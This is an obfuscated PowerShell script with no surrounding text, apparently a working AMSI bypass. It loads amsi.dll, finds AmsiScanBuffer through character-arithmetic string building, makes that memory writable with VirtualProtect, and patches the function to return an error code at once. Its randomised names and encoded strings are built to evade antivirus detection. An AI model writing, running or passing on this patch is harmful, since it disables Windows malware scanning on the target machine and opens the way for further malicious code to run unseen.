$bCIcfkFlDr3B = @"
using System;
using System.Runtime.InteropServices;
public class bCIcfkFlDr3B {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr jIsShLr1, string jmomp);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr S8YJ72QHCCJP, UIntPtr vGGGHTMWYW6aR_MFf, uint I2QaGRXerLl2nBjtGtH, out uint b6MM);
}
"@

Add-Type $bCIcfkFlDr3B

$nclHl_9aB = [bCIcfkFlDr3B]::LoadLibrary("$(('ám'+'sì'+'.d'+'ll').normaLIze([chAr]([byte]0x46)+[Char](111)+[ChAR](114)+[chAR]([bYTE]0x6d)+[chAr](68*23/23)) -replace [cHaR](92*68/68)+[cHaR](112*108/108)+[cHAR](123)+[cHAr](77*61/61)+[CHaR]([ByTE]0x6e)+[ChAr](125))")
$rsfmOZDs9qZ64_5 = [bCIcfkFlDr3B]::GetProcAddress($nclHl_9aB, "$([char]([ByTE]0x41)+[chAr]([BYTE]0x6d)+[cHaR](29+86)+[cHAr](50+55)+[char]([BYTe]0x53)+[char](99+35-35)+[cHAR]([bYTe]0x61)+[char](110)+[CHaR](66*35/35)+[chaR]([byTE]0x75)+[ChAR](102)+[chaR](102)+[Char]([BYTe]0x65)+[cHAr]([BYtE]0x72))")
$p = 0
[bCIcfkFlDr3B]::VirtualProtect($rsfmOZDs9qZ64_5, [uint32]5, 0x40, [ref]$p)
$DPRNF8PDinKTj27 = "0xB8"
$Lo8oQTGh = "0x57"
$yXVX = "0x00"
$oA9OeCpyoN4nzs2g = "0x07"
$I9eRwfIY01K3IVZ88LwM = "0x80"
$jPkBwyO = "0xC3"
$SZpU7AxuNjhGvyx = [Byte[]] ($DPRNF8PDinKTj27,$Lo8oQTGh,$yXVX,$oA9OeCpyoN4nzs2g,+$I9eRwfIY01K3IVZ88LwM,+$jPkBwyO)
[System.Runtime.InteropServices.Marshal]::Copy($SZpU7AxuNjhGvyx, 0, $rsfmOZDs9qZ64_5, 6)